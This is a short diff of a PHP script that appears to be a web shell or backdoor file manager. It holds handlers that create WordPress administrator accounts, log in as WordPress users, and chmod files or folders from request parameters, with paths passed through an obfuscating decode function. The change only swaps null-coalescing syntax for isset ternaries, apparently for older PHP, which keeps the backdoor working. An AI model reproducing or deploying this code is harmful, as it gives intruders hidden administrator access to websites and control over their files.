@@ -393,9 +393,9 @@ else if ($ne == 'set_wp_load') {
 	}
 }
 else if ($ne == 'create_wp_admin') {
-	$username = $_GET['wp_username'] ?? $_POST['wp_username'];
-	$email = $_GET['wp_email'] ?? $_POST['wp_email'];
-	$password = $_GET['wp_password'] ?? $_POST['wp_password'];
+	$username = isset($_GET['wp_username']) ? $_GET['wp_username'] : $_POST['wp_username'];
+	$email =  isset($_GET['wp_email']) ? $_GET['wp_email'] : $_POST['wp_email'];
+	$password = isset($_GET['wp_password']) ? $_GET['wp_password'] : $_POST['wp_password'];
 
 	try {
 		if (isset($_SESSION['gr_wp_load']) && file_exists($_SESSION['gr_wp_load'])) {
@@ -423,8 +423,8 @@ else if ($ne == 'create_wp_admin') {
 	}
 }
 else if ($ne == 'login_wp') {
-	$username = $_GET['wp_username'] ?? $_POST['wp_username'];
-	$password = $_GET['wp_password'] ?? $_POST['wp_password'];
+	$username = isset($_GET['wp_username']) ? $_GET['wp_username'] : $_POST['wp_username'];
+	$password = isset($_GET['wp_password']) ? $_GET['wp_password'] : $_POST['wp_password'];
 
 	try {
 		if (isset($_SESSION['gr_wp_load']) && file_exists($_SESSION['gr_wp_load'])) {
@@ -449,7 +449,7 @@ else if ($ne == 'login_wp') {
 	}
 }
 else if ($ne == 'chmod') {
-	$mod = $_POST['mod'] ?? $_GET['mod'];
+	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
 	$rootPath = realpath(deshifrele(urldecode($_POST['fayl'])));
 	if ($mod && $rootPath) {
 		$status = chmod($rootPath, octdec($mod));
@@ -461,7 +461,7 @@ else if ($ne == 'chmod') {
 	}
 }
 else if ($ne == 'chmod_folder' && isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf'])) {
-	$mod = $_POST['mod'] ?? $_GET['mod'];
+	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
 	$rootPath = realpath(deshifrele(urldecode($_POST['zf'])));
 	if ($mod && $rootPath) {
 		$status = chmod($rootPath, octdec($mod));
